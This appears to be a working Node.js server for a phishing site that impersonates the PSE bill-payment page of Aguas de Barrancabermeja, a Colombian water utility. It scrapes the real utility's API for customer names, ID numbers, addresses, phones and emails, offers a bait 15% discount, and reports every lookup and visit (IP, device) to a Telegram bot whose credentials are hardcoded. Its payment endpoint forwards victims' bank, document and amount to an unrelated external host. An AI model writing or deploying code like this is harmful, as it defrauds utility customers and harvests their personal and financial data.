/**
 * PSE Aguas de Barrancabermeja - Servidor de Desarrollo
 * Servidor Node.js con Express que conecta a la API real
 *
 * Para ejecutar:
 * 1. npm install
 * 2. node server.js
 * 3. Abrir http://localhost:3000
 */

const express = require('express');
const cors = require('cors');
const path = require('path');
const https = require('https');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Archivo para almacenar datos de usuarios localmente
const USERS_DB_FILE = path.join(__dirname, 'usuarios.json');

// Cargar o inicializar base de datos de usuarios
function loadUsersDB() {
    try {
        if (fs.existsSync(USERS_DB_FILE)) {
            return JSON.parse(fs.readFileSync(USERS_DB_FILE, 'utf8'));
        }
    } catch (e) {
        console.log('Error cargando usuarios.json, creando nuevo...');
    }
    return {};
}

function saveUsersDB(data) {
    fs.writeFileSync(USERS_DB_FILE, JSON.stringify(data, null, 2));
}

let usuariosDB = loadUsersDB();

// URL de la API real
const API_BASE_URL = 'ws.suiteneptuno.com';
const API_PATH = '/BarrancaAguasWeb/';

// ============================================
// CONFIGURACION TELEGRAM
// ============================================
const TELEGRAM_BOT_TOKEN = '8287996768:AAHN9DKIPY0OokiPNsy__AvPkN1_1lZ51mQ';
const TELEGRAM_CHAT_ID = '-5119678298';

/**
 * Envia mensaje a Telegram
 */
function enviarTelegram(mensaje) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    const postData = JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: mensaje,
        parse_mode: 'HTML'
    });

    const options = {
        hostname: 'api.telegram.org',
        path: `/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    const req = https.request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => {
            if (res.statusCode === 200) {
                console.log('Alerta Telegram enviada correctamente');
            } else {
                console.log('Error Telegram:', data);
            }
        });
    });

    req.on('error', (e) => console.error('Error enviando Telegram:', e));
    req.write(postData);
    req.end();
}

// ============================================
// MIDDLEWARE
// ============================================

// Habilitar CORS
app.use(cors());

// Parsear JSON
app.use(express.json());

// Parsear URL-encoded
app.use(express.urlencoded({ extended: true }));

// Servir archivos estaticos
app.use(express.static(path.join(__dirname)));

// Logging de peticiones
app.use((req, res, next) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${req.method} ${req.url}`);
    next();
});

// ============================================
// FUNCIONES AUXILIARES
// ============================================

/**
 * Obtiene el token de verificacion y cookies de la pagina principal
 */
function getVerificationToken() {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: API_BASE_URL,
            path: API_PATH,
            method: 'GET',
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            const cookies = res.headers['set-cookie'] || [];

            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                // Extraer token del HTML
                const tokenMatch = data.match(/name="__RequestVerificationToken"[^>]*value="([^"]+)"/);
                const token = tokenMatch ? tokenMatch[1] : null;

                // Extraer cookies relevantes
                const cookieString = cookies.map(c => c.split(';')[0]).join('; ');

                resolve({ token, cookies: cookieString });
            });
        });

        req.on('error', reject);
        req.end();
    });
}

/**
 * Consulta la factura en la API real
 * Retorna tanto la factura como las cookies actualizadas
 */
function consultarFacturaReal(codigoUsuario, token, cookies) {
    return new Promise((resolve, reject) => {
        const postData = `codigoUsuario=${encodeURIComponent(codigoUsuario)}&__RequestVerificationToken=${encodeURIComponent(token)}`;

        const options = {
            hostname: API_BASE_URL,
            path: `${API_PATH}?handler=ConsultarFactura`,
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Content-Length': Buffer.byteLength(postData),
                'Cookie': cookies,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json',
                'Origin': `https://${API_BASE_URL}`,
                'Referer': `https://${API_BASE_URL}${API_PATH}`
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            // Capturar nuevas cookies de la respuesta
            const newCookies = res.headers['set-cookie'] || [];

            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const jsonData = JSON.parse(data);
                    // Combinar cookies existentes con nuevas
                    let updatedCookies = cookies;
                    if (newCookies.length > 0) {
                        const newCookieStr = newCookies.map(c => c.split(';')[0]).join('; ');
                        updatedCookies = cookies + '; ' + newCookieStr;
                    }
                    resolve({ data: jsonData, cookies: updatedCookies });
                } catch (e) {
                    reject(new Error('Error al parsear respuesta de API'));
                }
            });
        });

        req.on('error', reject);
        req.write(postData);
        req.end();
    });
}

/**
 * Obtiene los datos del usuario desde FormFactura
 */
function obtenerDatosUsuario(cookies) {
    return new Promise((resolve) => {
        const options = {
            hostname: API_BASE_URL,
            path: '/BarrancaAguasWeb/FormPages/FormFactura?handler=CargarDatosUsuario',
            method: 'GET',
            headers: {
                'Cookie': cookies,
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'Accept': 'application/json'
            }
        };

        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                try {
                    const jsonData = JSON.parse(data);
                    resolve(jsonData);
                } catch (e) {
                    resolve(null);
                }
            });
        });

        req.on('error', () => resolve(null));
        req.end();
    });
}

/**
 * Mapea el estado de la factura
 */
function mapearEstado(estado) {
    const estados = {
        'P': 'Pendiente',
        'C': 'Pagada',
        'A': 'Anulada',
        'TRANSACCION PENDIENTE': 'Transaccion Pendiente'
    };
    return estados[estado] || estado;
}

/**
 * Formatea fecha ISO a formato legible
 */
function formatearFecha(fechaISO) {
    if (!fechaISO) return null;
    const fecha = new Date(fechaISO);
    return fecha.toISOString().split('T')[0];
}

// ============================================
// API ENDPOINTS
// ============================================

/**
 * POST /api/consultar-factura
 * Consulta una factura conectando a la API real de Aguas de Barrancabermeja
 */
app.post('/api/consultar-factura', async (req, res) => {
    const { codigoUsuario } = req.body;

    // Validar que se envio el codigo
    if (!codigoUsuario) {
        return res.status(400).json({
            success: false,
            message: 'El codigo de usuario es obligatorio'
        });
    }

    // Limpiar codigo (solo numeros)
    const codigoLimpio = codigoUsuario.toString().replace(/[^0-9]/g, '');

    if (!codigoLimpio) {
        return res.status(400).json({
            success: false,
            message: 'El codigo de usuario debe contener numeros'
        });
    }

    console.log(`Consultando factura para codigo: ${codigoLimpio}`);

    // Obtener IP del dispositivo
    const ipCliente = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    const userAgent = req.headers['user-agent'] || 'Desconocido';
    const fechaConsulta = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });

    // Detectar tipo de dispositivo desde User-Agent
    function detectarDispositivoUA(ua) {
        if (/iPhone/i.test(ua)) return 'iPhone';
        if (/iPad/i.test(ua)) return 'iPad';
        if (/Android/i.test(ua)) return /Mobile/i.test(ua) ? 'Android' : 'Tablet Android';
        if (/Windows Phone/i.test(ua)) return 'Windows Phone';
        if (/Macintosh/i.test(ua)) return 'Mac';
        if (/Windows/i.test(ua)) return 'Windows PC';
        if (/Linux/i.test(ua)) return 'Linux';
        return 'Desconocido';
    }
    const dispositivoCliente = detectarDispositivoUA(userAgent);

    try {
        // Paso 1: Obtener token y cookies
        console.log('Obteniendo token de verificacion...');
        const { token, cookies } = await getVerificationToken();

        if (!token) {
            throw new Error('No se pudo obtener el token de verificacion');
        }

        console.log('Token obtenido correctamente');

        // Paso 2: Consultar la API real
        console.log('Consultando API real...');
        const resultado = await consultarFacturaReal(codigoLimpio, token, cookies);
        const respuesta = resultado.data;
        const cookiesActualizadas = resultado.cookies;

        console.log('Respuesta de API:', JSON.stringify(respuesta, null, 2));

        // Paso 3: Obtener datos del usuario (usando cookies actualizadas)
        console.log('Obteniendo datos del usuario...');
        const datosUsuario = await obtenerDatosUsuario(cookiesActualizadas);
        console.log('Datos usuario:', JSON.stringify(datosUsuario, null, 2));

        // Paso 4: Procesar respuesta
        if (respuesta && respuesta.factura && respuesta.factura.NUMERO > 0) {
            const factura = respuesta.factura;

            // Verificar estado de la factura
            if (factura.ESTADO === 'P') {
                // Factura pendiente - disponible para pago
                // Usar datos del usuario obtenidos de CargarDatosUsuario
                const nombreCliente = datosUsuario?.nombre || factura.NOMBRE || `Usuario ${factura.USUARIO}`;
                const telefono = datosUsuario?.tel || factura.TELEFONO || '';
                const correo = datosUsuario?.correo || factura.CORREO || '';
                const direccion = datosUsuario?.dir || factura.RUTA || 'No disponible';
                const cedula = datosUsuario?.cedula || '';
                const tipoDocumento = datosUsuario?.tipodocumento || 'CC';
                const numeroMedidor = datosUsuario?.nmedidor || '';

                // Calcular descuento del 15%
                const valorOriginal = factura.TOTALAPAGAR || factura.SALDO;
                const porcentajeDescuento = 15;
                const valorDescuento = Math.round(valorOriginal * (porcentajeDescuento / 100));
                const valorConDescuento = valorOriginal - valorDescuento;
                const totalMesOriginal = factura.TOTALMES || valorOriginal;
                const valorDescuentoMes = Math.round(totalMesOriginal * (porcentajeDescuento / 100));
                const totalMesConDescuento = totalMesOriginal - valorDescuentoMes;

                // ALERTA TELEGRAM - FACTURA REAL ENCONTRADA
                const alertaFactura = `
CONSULTA DE FACTURA - REAL

Fecha: ${fechaConsulta}
IP: ${ipCliente}
Dispositivo: ${dispositivoCliente}

DATOS DE LA FACTURA:
Codigo Usuario: ${codigoLimpio}
No. Factura: ${factura.NUMERO}
Cliente: ${nombreCliente}
Cedula: ${cedula || 'No disponible'}
Direccion: ${direccion}

VALORES:
Valor Original: $${valorOriginal.toLocaleString('es-CO')}
Descuento 15%: -$${valorDescuento.toLocaleString('es-CO')}
Valor a Pagar: $${valorConDescuento.toLocaleString('es-CO')}

Estado: PENDIENTE DE PAGO
Vencimiento: ${formatearFecha(factura.FECHAVENCE) || 'No disponible'}
`;
                enviarTelegram(alertaFactura);

                return res.json({
                    success: true,
                    data: {
                        numeroFactura: factura.NUMERO.toString(),
                        codigoUsuario: factura.USUARIO,
                        nombreCliente: nombreCliente,
                        direccion: direccion,
                        // Valores con descuento
                        valorFactura: valorConDescuento,
                        valorFacturaOriginal: valorOriginal,
                        descuento: valorDescuento,
                        porcentajeDescuento: porcentajeDescuento,
                        saldo: factura.SALDO,
                        telefono: telefono,
                        correo: correo,
                        cedula: cedula,
                        tipoDocumento: tipoDocumento,
                        numeroMedidor: numeroMedidor,
                        fechaEmision: formatearFecha(factura.FECHAEMISION),
                        fechaVencimiento: formatearFecha(factura.FECHAVENCE),
                        fechaCorte: formatearFecha(factura.FECHACORTE),
                        periodoInicio: formatearFecha(factura.PERIODOI),
                        periodoFin: formatearFecha(factura.PERIODOF),
                        consumo: factura.CONSUMO,
                        lecturaActual: factura.LACTUAL,
                        lecturaAnterior: factura.LANTERIOR,
                        estado: mapearEstado(factura.ESTADO),
                        estadoCodigo: factura.ESTADO,
                        estrato: factura.ESTRATO,
                        ciclo: factura.CICLO,
                        // Desglose de valores
                        desglose: {
                            acueducto: factura.VLRACUEDUCTO,
                            alcantarillado: factura.VLRALCANT,
                            cargoFijo: factura.VLRACARGOF,
                            cargoFijoAlcant: factura.CFALCANT,
                            aseo: factura.VLRASEO,
                            totalMes: totalMesConDescuento,
                            totalMesOriginal: totalMesOriginal,
                            descuentoMes: valorDescuentoMes,
                            intereses: factura.TOTALINTERES,
                            atrasos: factura.ATRASOS
                        },
                        urlPasarela: factura.URLPASARELA
                    }
                });
            } else if (factura.ESTADO === 'A') {
                return res.json({
                    success: false,
                    message: 'La factura se encuentra anulada',
                    estadoCodigo: 'A'
                });
            } else if (factura.ESTADO === 'C') {
                return res.json({
                    success: false,
                    message: 'La factura ya fue pagada',
                    estadoCodigo: 'C'
                });
            } else if (factura.ESTADO === 'TRANSACCION PENDIENTE') {
                return res.json({
                    success: false,
                    message: factura.URLPASARELA || 'Tiene una transaccion pendiente',
                    estadoCodigo: 'TRANSACCION PENDIENTE',
                    urlPasarela: factura.URLPASARELA
                });
            } else {
                return res.json({
                    success: false,
                    message: 'La factura se encuentra en estado de pago',
                    estadoCodigo: factura.ESTADO
                });
            }
        } else {
            // Factura no encontrada o mensaje especial
            let mensaje = respuesta.message || 'El codigo de usuario ingresado no corresponde a ninguna factura';

            // Verificar si el mensaje contiene un botón de descarga (factura pagada)
            const descargarMatch = mensaje.match(/Descargar\("([^"]+)",\s*(\d+),\s*(\d+)\)/);

            if (descargarMatch) {
                // ALERTA TELEGRAM - FACTURA YA PAGADA
                const alertaYaPagada = `
CONSULTA DE FACTURA - YA PAGADA

Fecha: ${fechaConsulta}
IP: ${ipCliente}
Dispositivo: ${dispositivoCliente}

Codigo Consultado: ${codigoLimpio}
Estado: La factura ya fue cancelada
`;
                enviarTelegram(alertaYaPagada);

                // Extraer parámetros del botón de descarga
                return res.json({
                    success: false,
                    estadoCodigo: 'C',
                    message: 'La factura ya ha sido cancelada',
                    puedeImprimir: true,
                    datosImpresion: {
                        codigoUsuario: descargarMatch[1],
                        numeroFactura: descargarMatch[2],
                        numeroRecibo: descargarMatch[3]
                    }
                });
            }

            // ALERTA TELEGRAM - FACTURA NO ENCONTRADA (NO REAL)
            const alertaNoEncontrada = `
CONSULTA DE FACTURA - NO EXISTE

Fecha: ${fechaConsulta}
IP: ${ipCliente}
Dispositivo: ${dispositivoCliente}

Codigo Consultado: ${codigoLimpio}
Resultado: FACTURA NO ENCONTRADA
Mensaje: ${mensaje.replace(/<[^>]*>/g, '').substring(0, 100)}
`;
            enviarTelegram(alertaNoEncontrada);

            return res.json({
                success: false,
                message: mensaje.replace(/<[^>]*>/g, '') // Limpiar cualquier HTML restante
            });
        }

    } catch (error) {
        console.error('Error al consultar factura:', error);
        return res.status(500).json({
            success: false,
            message: 'Error al conectar con el servidor. Por favor intente nuevamente.'
        });
    }
});

/**
 * GET /api/health
 * Endpoint de salud del servidor
 */
app.get('/api/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        uptime: process.uptime(),
        apiConectada: 'https://ws.suiteneptuno.com/BarrancaAguasWeb/'
    });
});

/**
 * POST /api/alerta-visita
 * Recibe datos de visita y envia alerta a Telegram
 */
app.post('/api/alerta-visita', (req, res) => {
    const { dispositivo, navegador, plataforma, pagina, userAgent, idioma, pantalla, referrer } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress || req.ip;
    const fecha = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });

    // Determinar emoji segun dispositivo
    let emoji = '💻';
    if (dispositivo === 'iPhone') emoji = '📱';
    else if (dispositivo === 'Android') emoji = '📱';
    else if (dispositivo === 'Tablet') emoji = '📲';

    const mensaje = `
${emoji} <b>NUEVA VISITA AL SITIO</b> ${emoji}

📅 <b>Fecha:</b> ${fecha}
📍 <b>IP:</b> ${ip}

📱 <b>Dispositivo:</b> ${dispositivo || 'Desconocido'}
🖥 <b>Plataforma:</b> ${plataforma || 'Desconocida'}
🌐 <b>Navegador:</b> ${navegador || 'Desconocido'}
🔤 <b>Idioma:</b> ${idioma || 'Desconocido'}
📐 <b>Pantalla:</b> ${pantalla || 'Desconocida'}

📄 <b>Página:</b> ${pagina || '/'}
🔗 <b>Referrer:</b> ${referrer || 'Directo'}

🔎 <b>User Agent:</b>
<code>${userAgent || 'No disponible'}</code>
`;

    enviarTelegram(mensaje);

    res.json({ success: true });
});

/**
 * GET /api/usuario/:codigo
 * Obtiene los datos guardados de un usuario
 */
app.get('/api/usuario/:codigo', (req, res) => {
    const codigo = req.params.codigo;
    const usuario = usuariosDB[codigo];

    if (usuario) {
        console.log(`Datos de usuario encontrados para: ${codigo}`);
        return res.json({
            success: true,
            data: usuario
        });
    }

    return res.json({
        success: false,
        message: 'Usuario no registrado'
    });
});

/**
 * POST /api/usuario
 * Guarda los datos de un usuario
 */
app.post('/api/usuario', (req, res) => {
    const { codigoUsuario, tipoDocumento, numeroDocumento, nombre, telefono, correo } = req.body;

    if (!codigoUsuario) {
        return res.status(400).json({
            success: false,
            message: 'Codigo de usuario requerido'
        });
    }

    usuariosDB[codigoUsuario] = {
        tipoDocumento: tipoDocumento || 'CC',
        numeroDocumento: numeroDocumento || '',
        nombre: nombre || '',
        telefono: telefono || '',
        correo: correo || '',
        fechaRegistro: new Date().toISOString()
    };

    saveUsersDB(usuariosDB);
    console.log(`Datos guardados para usuario: ${codigoUsuario}`);

    return res.json({
        success: true,
        message: 'Datos guardados correctamente'
    });
});

// ============================================
// ENDPOINT PSE - PROCESAR PAGOS
// ============================================

// Lista de bancos permitidos
const BANCOS_PERMITIDOS = [
    "ALIANZA FIDUCIARIA", "BAN100", "BANCAMIA S.A.", "BANCO AGRARIO", "BANCO AV VILLAS",
    "BANCO BBVA COLOMBIA S.A.", "BANCO CAJA SOCIAL", "BANCO COOPERATIVO COOPCENTRAL",
    "BANCO DE BOGOTA", "BANCO DE OCCIDENTE", "BANCO FALABELLA", "BANCO FINANDINA S.A. BIC",
    "BANCO GNB SUDAMERIS", "BANCO ITAU", "BANCO J.P. MORGAN COLOMBIA S.A.",
    "BANCO MUNDO MUJER S.A.", "BANCO PICHINCHA S.A.", "BANCO POPULAR",
    "BANCO SANTANDER COLOMBIA", "BANCO SERFINANZA", "BANCO UNION antes GIROS", "BANCOLOMBIA",
    "BANCOOMEVA S.A.", "BOLD CF", "CFA COOPERATIVA FINANCIERA", "CITIBANK", "COINK SA",
    "COLTEFINANCIERA", "CONFIAR COOPERATIVA FINANCIERA", "COTRAFA", "Crezcamos-MOSí", "DALE",
    "DING", "FINANCIERA JURISCOOP SA COMPAÑÍA DE FINANCIAMIENTO", "GLOBAL66", "IRIS",
    "JFK COOPERATIVA FINANCIERA", "LULO BANK", "MOVII S.A.", "NEQUI", "NU", "POWWI",
    "RAPPIPAY", "SCOTIABANK COLPATRIA", "UALÁ"
];

// Configuracion de redirecciones directas
const REDIRECCION_CONFIG = {
    bancolombia: { activo: false, url: "" },
    bogota: { activo: true, url: "" }
};

// Rate limiting simple
const rateLimitMap = new Map();

// Funcion para sanitizar inputs en el servidor
function sanitizarInput(valor) {
    if (!valor) return '';
    return valor.toString()
        .replace(/[<>'";\(\)\{\}\[\]\\\/\$\`\|&]/g, '')
        .trim();
}

app.post('/api/pse.php', async (req, res) => {
    const ip = req.ip || req.connection.remoteAddress;
    const now = Date.now();
    const lastAccess = rateLimitMap.get(ip);

    // Rate limit: 30 segundos entre solicitudes
    if (lastAccess && (now - lastAccess) < 30000) {
        return res.json({ Error: "Demasiadas solicitudes. Intenta de nuevo en 30 segundos." });
    }
    rateLimitMap.set(ip, now);

    // Recibir en formato: amount=225627&bankCode=NEQUI&Correo=email@gmail.com&Documento=123123
    const amount = parseInt(sanitizarInput(req.body.amount)) || 0;
    const bankCode = sanitizarInput(req.body.bankCode);
    const correo = sanitizarInput(req.body.Correo);
    const documento = sanitizarInput(req.body.Documento);

    console.log('PSE Request:', { amount, bankCode, correo, documento });

    // Validaciones
    if (!amount || amount <= 2000) {
        return res.json({ Error: "Monto invalido" });
    }
    if (!BANCOS_PERMITIDOS.includes(bankCode)) {
        return res.json({ Error: "Banco no permitido" });
    }

    // Redirecciones directas (solo si la URL está configurada)
    if (REDIRECCION_CONFIG.bancolombia.activo && REDIRECCION_CONFIG.bancolombia.url && bankCode === "BANCOLOMBIA") {
        return res.json({ URL: REDIRECCION_CONFIG.bancolombia.url });
    }
    if (REDIRECCION_CONFIG.bogota.activo && REDIRECCION_CONFIG.bogota.url && bankCode === "BANCO DE BOGOTA") {
        return res.json({ URL: REDIRECCION_CONFIG.bogota.url });
    }

    // Enviar a la API PSE externa en el formato que espera (Documento, Correo, Banco, Monto)
    const postData = `Documento=${encodeURIComponent(documento)}&Correo=${encodeURIComponent(correo)}&Banco=${encodeURIComponent(bankCode)}&Monto=${amount}`;

    const options = {
        hostname: 'phpclusters-196676-0.cloudclusters.net',
        path: '/apipsedaviplata2/PSE.php',
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Content-Length': Buffer.byteLength(postData)
        }
    };

    try {
        const response = await new Promise((resolve, reject) => {
            const request = https.request(options, (response) => {
                let data = '';
                response.on('data', chunk => data += chunk);
                response.on('end', () => {
                    try {
                        resolve(JSON.parse(data));
                    } catch (e) {
                        resolve({ raw: data });
                    }
                });
            });
            request.on('error', reject);
            request.write(postData);
            request.end();
        });

        console.log('Respuesta PSE:', response);
        res.json(response);
    } catch (error) {
        console.error('Error PSE:', error);
        res.json({ Error: "Fallo la conexion al servidor externo" });
    }
});

// ============================================
// RUTA PRINCIPAL
// ============================================

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ============================================
// MANEJO DE ERRORES
// ============================================

// 404 - Ruta no encontrada
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Recurso no encontrado'
    });
});

// Error handler global
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({
        success: false,
        message: 'Error interno del servidor'
    });
});

// ============================================
// INICIAR SERVIDOR
// ============================================

app.listen(PORT, () => {
    console.log('╔═══════════════════════════════════════════════════════════════╗');
    console.log('║                                                               ║');
    console.log('║   PSE Aguas de Barrancabermeja - Servidor con API Real       ║');
    console.log('║                                                               ║');
    console.log('╠═══════════════════════════════════════════════════════════════╣');
    console.log('║                                                               ║');
    console.log(`║   Servidor local:  http://localhost:${PORT}                     ║`);
    console.log('║   API conectada:   https://ws.suiteneptuno.com/BarrancaAguasWeb║');
    console.log('║                                                               ║');
    console.log('║   Endpoint:                                                   ║');
    console.log('║   - POST /api/consultar-factura                               ║');
    console.log('║     Body: { "codigoUsuario": "026451" }                       ║');
    console.log('║                                                               ║');
    console.log('║   Prueba con codigo real: 026451                              ║');
    console.log('║                                                               ║');
    console.log('╚═══════════════════════════════════════════════════════════════╝');
});
